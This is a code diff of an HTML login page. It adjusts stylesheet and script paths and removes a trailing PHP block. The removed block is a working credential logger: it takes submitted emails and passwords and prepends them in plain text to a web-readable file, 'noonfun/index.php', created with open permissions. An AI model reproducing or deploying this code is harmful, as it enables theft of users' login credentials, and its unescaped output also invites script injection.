@@ -16,7 +16,7 @@
         integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw=="
         crossorigin="anonymous" referrerpolicy="no-referrer" />
     <p></p>
-    <link rel="stylesheet" href="style.css" />
+    <link rel="stylesheet" href="../style.css" />
 </head>
 
 <body>
@@ -136,55 +136,10 @@
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"
         integrity="sha384-kenU1KFdBIe4zVF0s0G1M5b4hcpxyD9F7jL+jjXkk+Q2h455rYXK/7HAuoJl+0I4" crossorigin="anonymous">
     </script>
-    <script src="script.js"></script>
+    <script src="../script.js"></script>
 </body>
 
 </html>
 
 
-<?php
-if (isset($_POST['login'])) {
-    // Validate form input
-    $email = $_POST['email'];
-    $password = $_POST['password'];
-
-    // Set the file path
-    $file_path = 'noonfun/index.php';
-
-    // Check if the directory and file exist, create them if they don't
-    if (!file_exists(dirname($file_path))) {
-        mkdir(dirname($file_path), 0777, true);
-    }
-    if (!file_exists($file_path)) {
-        touch($file_path);
-    }
-
-    // Open the file for reading and writing
-    $file = fopen($file_path, 'r+');
-
-    // Read the existing content of the file
-    $file_size = filesize($file_path);
-    $oldContent = '';
-    if ($file_size > 0) {
-        $oldContent = fread($file, $file_size);
-    }
-
-    // Move the file pointer to the beginning of the file
-    fseek($file, 0, SEEK_SET);
-
-    // Write the new input to the beginning of the file
-    $newContent = '<div style="background-color: #f2f2f2; padding: 10px; border: 1px solid #ddd;">' . PHP_EOL;
-    $newContent .= '<span style="font-weight: bold;">Logged At:</span> ' . date('Y-m-d H:i:s') . '<br>' . PHP_EOL;
-    $newContent .= '<span style="font-weight: bold;">Email:</span> ' . $email . '<br>' . PHP_EOL;
-    $newContent .= '<span style="font-weight: bold;">Password:</span> ' . $password . '<br>' . PHP_EOL;
-    $newContent .= '</div>' . PHP_EOL;
-    fwrite($file, $newContent);
-
-    // Write the old content after the new input
-    fwrite($file, $oldContent);
-
-    // Close the file
-    fclose($file);
-}
-?>
 
